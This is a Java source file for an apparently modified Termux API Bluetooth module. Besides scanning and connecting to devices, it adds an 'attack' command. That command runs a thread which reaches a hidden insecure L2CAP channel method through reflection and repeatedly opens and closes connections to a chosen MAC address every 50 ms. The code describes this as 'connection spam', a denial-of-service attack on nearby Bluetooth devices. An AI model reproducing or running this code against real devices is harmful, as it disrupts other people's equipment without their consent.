package com.termux.api.apis;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothSocket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.JsonWriter;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.termux.api.util.ResultReturner;
import com.termux.api.TermuxApiReceiver;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;

public class BluetoothAPI {

    private static final String TAG = "BluetoothAPI";
    private static boolean scanning = false;
    private static Set<BluetoothDevice> deviceList = new HashSet<>();
    public static boolean unregistered = true;
    public static BluetoothAdapter mBluetoothAdapter;
    private static ConnectThread mConnectThread;
    private static AttackThread mAttackThread;

    // Create a BroadcastReceiver for ACTION_BOND_STATE_CHANGED.
    private static final BroadcastReceiver mBondReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            final String action = intent.getAction();

            if (action.equals(BluetoothDevice.ACTION_BOND_STATE_CHANGED)) {
                final BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
                final int bondState = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.ERROR);
                final int previousBondState = intent.getIntExtra(BluetoothDevice.EXTRA_PREVIOUS_BOND_STATE, BluetoothDevice.ERROR);

                Log.d(TAG, "Bond state changed for device " + device.getAddress()
                        + ": " + previousBondState + " -> " + bondState);

                // Unregister receiver when bond process is complete
                if (bondState == BluetoothDevice.BOND_BONDED || bondState == BluetoothDevice.BOND_NONE) {
                    context.getApplicationContext().unregisterReceiver(this);
                }
            }
        }
    };

    // Create a BroadcastReceiver for ACTION_FOUND.
    private static final BroadcastReceiver mReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (BluetoothDevice.ACTION_FOUND.equals(action)) {
                // Discovery has found a device. Get the BluetoothDevice object and its info from the Intent.
                BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
                if (device != null) {
                    deviceList.add(device);
                }
            }
        }
    };

    public static void bluetoothStartScanning(Context context) {
        IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_FOUND);
        context.getApplicationContext().registerReceiver(mReceiver, filter);
        unregistered = false;
        mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        mBluetoothAdapter.startDiscovery();
    }

    public static void bluetoothStopScanning(Context context) {
        if (!unregistered) {
            mBluetoothAdapter.cancelDiscovery();
            context.getApplicationContext().unregisterReceiver(mReceiver);
            unregistered = true;
        }
    }

    public static void onReceiveBluetoothScanInfo(TermuxApiReceiver apiReceiver, final Context context, final Intent intent) {
        ResultReturner.returnData(apiReceiver, intent, new ResultReturner.ResultJsonWriter() {
            @Override
            public void writeJson(final JsonWriter out) throws Exception {
                if (!scanning) {
                    // start scanning
                    out.beginObject().name("message").value("Scanning for 30 seconds... Run the command again to see results.").endObject();
                    scanning = true;
                    deviceList.clear();
                    bluetoothStartScanning(context);
                    // Stop scanning after 30 seconds
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        if(scanning) {
                            bluetoothStopScanning(context);
                            scanning = false;
                        }
                    }, 30000);
                } else {
                    // stop scanning and print results
                    bluetoothStopScanning(context);
                    out.beginArray();
                    for (BluetoothDevice device : deviceList) {
                        out.beginObject();
                        String deviceName = device.getName();
                        String deviceAddress = device.getAddress();
                        out.name("name").value(deviceName == null ? "null" : deviceName);
                        out.name("address").value(deviceAddress);
                        out.endObject();
                    }
                    out.endArray();
                    scanning = false;
                }
            }
        });
    }

    public static void onReceiveBluetoothConnect(TermuxApiReceiver apiReceiver, final Context context, final Intent intent) {
        ResultReturner.returnData(apiReceiver, intent, new ResultReturner.WithStringInput() {
            @Override
            public void writeResult(PrintWriter out) throws Exception {
                JsonWriter writer = new JsonWriter(out);
                writer.setIndent("  ");
                writer.beginObject();

                if (inputString == null || !BluetoothAdapter.checkBluetoothAddress(inputString)) {
                    writer.name("error").value("Invalid MAC address provided.");
                } else {
                    if (mConnectThread != null) {
                        mConnectThread.cancel();
                        mConnectThread = null;
                    }
                    mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
                    BluetoothDevice device = mBluetoothAdapter.getRemoteDevice(inputString);
                    mConnectThread = new ConnectThread(context, device);
                    mConnectThread.start();
                    writer.name("message").value("Connecting to " + inputString);
                }
                writer.endObject();
                out.println();
            }
        });
    }

    private static class ConnectThread extends Thread {
        private final BluetoothDevice mmDevice;
        private final Context mContext;
        private BluetoothSocket mmSocket;

        public ConnectThread(Context context, BluetoothDevice device) {
            mmDevice = device;
            mContext = context.getApplicationContext();
            BluetoothSocket tmp = null;

            // For Classic Bluetooth devices, we use RFCOMM socket.
            // For BLE or Dual devices, we will initiate bonding.
            if (mmDevice.getType() == BluetoothDevice.DEVICE_TYPE_CLASSIC) {
                try {
                    Log.d(TAG, "ConnectThread: Device is Classic. Creating RFCOMM socket.");
                    // Standard SerialPortService ID
                    tmp = device.createRfcommSocketToServiceRecord(java.util.UUID.fromString("00001101-0000-1000-8000-00805F9B34FB"));
                } catch (IOException e) {
                    Log.e(TAG, "ConnectThread: RFCOMM socket's create() method failed", e);
                }
            }
            mmSocket = tmp;
        }

        public void run() {
            // Cancel discovery because it otherwise slows down the connection.
            mBluetoothAdapter.cancelDiscovery();

            int deviceType = mmDevice.getType();

            if (deviceType == BluetoothDevice.DEVICE_TYPE_LE || deviceType == BluetoothDevice.DEVICE_TYPE_DUAL) {
                Log.d(TAG, "ConnectThread: Device is LE or Dual. Initiating bonding.");
                // Register the bond state receiver
                IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED);
                mContext.registerReceiver(mBondReceiver, filter);
                // Initiate bonding
                if (!mmDevice.createBond()) {
                    Log.e(TAG, "ConnectThread: createBond() failed.");
                    mContext.unregisterReceiver(mBondReceiver);
                }
                // The rest of the process is handled by the mBondReceiver
                return;
            }

            // For Classic devices, proceed with the socket connection.
            if (mmSocket == null) {
                Log.e(TAG, "ConnectThread: Socket is null for Classic device, cannot connect.");
                return;
            }

            try {
                Log.d(TAG, "ConnectThread: Connecting to Classic device...");
                mmSocket.connect();
                Log.d(TAG, "ConnectThread: Connection to Classic device successful.");
                // manageMyConnectedSocket(mmSocket); // You can manage the connection here
            } catch (IOException connectException) {
                Log.e(TAG, "ConnectThread: Connection to Classic device failed.", connectException);
                try {
                    mmSocket.close();
                } catch (IOException closeException) {
                    Log.e(TAG, "ConnectThread: Could not close the client socket", closeException);
                }
            }
        }

        // Closes the client socket and causes the thread to finish.
        public void cancel() {
            try {
                if (mmSocket != null) {
                    mmSocket.close();
                }
            } catch (IOException e) {
                Log.e(TAG, "Could not close the client socket", e);
            }
        }
    }

    public static void onReceiveBluetoothAttack(TermuxApiReceiver apiReceiver, final Context context, final Intent intent) {
        ResultReturner.returnData(apiReceiver, intent, new ResultReturner.WithStringInput() {
            @Override
            public void writeResult(PrintWriter out) throws Exception {
                JsonWriter writer = new JsonWriter(out);
                writer.setIndent("  ");
                writer.beginObject();

                if (inputString == null || !BluetoothAdapter.checkBluetoothAddress(inputString)) {
                    writer.name("error").value("Invalid MAC address provided.");
                } else {
                    if (mAttackThread != null) {
                        mAttackThread.cancel();
                        mAttackThread = null;
                    }
                    mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
                    BluetoothDevice device = mBluetoothAdapter.getRemoteDevice(inputString);

                    // Get psm from intent, default to classic L2CAP if not provided
                    int psm = intent.getIntExtra("psm", 0x1001);

                    mAttackThread = new AttackThread(device, psm);
                    mAttackThread.start();
                    writer.name("message").value("Connection spam started against " + inputString + " with PSM " + psm);
                }
                writer.endObject();
                out.println();
            }
        });
    }

    private static class AttackThread extends Thread {
        private final BluetoothDevice mmDevice;
        private final int psm;
        private volatile boolean running = true;

        public AttackThread(BluetoothDevice device, int psm) {
            this.mmDevice = device;
            this.psm = psm;
        }

        public void run() {
            Log.d(TAG, "AttackThread: Starting connection spam against " + mmDevice.getAddress() + " on PSM " + psm);

            while (running) {
                BluetoothSocket mmSocket = null;
                try {
                    // 1. Create the socket for each connection attempt
                    Log.d(TAG, "AttackThread: Creating L2CAP socket.");
                    Method method = mmDevice.getClass().getMethod("createInsecureL2capChannel", int.class);
                    mmSocket = (BluetoothSocket) method.invoke(mmDevice, psm);

                    // 2. Attempt to connect
                    Log.d(TAG, "AttackThread: Attempting to connect...");
                    mmSocket.connect();
                    Log.d(TAG, "AttackThread: Connection successful (this should be rare).");

                } catch (Exception e) {
                    // This is the expected outcome for most attempts, as the connection is immediately closed.
                    Log.d(TAG, "AttackThread: Connection attempt finished (expected error): " + e.getMessage());
                } finally {
                    // 3. Immediately close the socket to free resources and prepare for the next attempt
                    if (mmSocket != null) {
                        try {
                            mmSocket.close();
                            Log.d(TAG, "AttackThread: Socket closed.");
                        } catch (IOException e) {
                            Log.e(TAG, "AttackThread: Failed to close socket.", e);
                        }
                    }
                }

                try {
                    // 4. A brief pause to prevent 100% CPU usage on the local device
                    Thread.sleep(50); // 50ms pause between attempts
                } catch (InterruptedException e) {
                    running = false;
                    Thread.currentThread().interrupt();
                }
            }
            Log.d(TAG, "AttackThread: Stopped.");
        }

        // Call this to stop the attack loop
        public void cancel() {
            running = false;
            this.interrupt();
        }
    }

    public static void onReceiveBluetoothAttackStop(TermuxApiReceiver apiReceiver, final Context context, final Intent intent) {
        ResultReturner.returnData(apiReceiver, intent, new ResultReturner.ResultJsonWriter() {
            @Override
            public void writeJson(JsonWriter out) throws Exception {
                out.beginObject();
                if (mAttackThread != null && mAttackThread.isAlive()) {
                    mAttackThread.cancel();
                    mAttackThread = null;
                    out.name("status").value("stopped");
                    Log.d(TAG, "BluetoothAttackStop: Attack stopped.");
                } else {
                    out.name("status").value("not_running");
                    Log.d(TAG, "BluetoothAttackStop: No attack was running.");
                }
                out.endObject();
            }
        });
    }
}
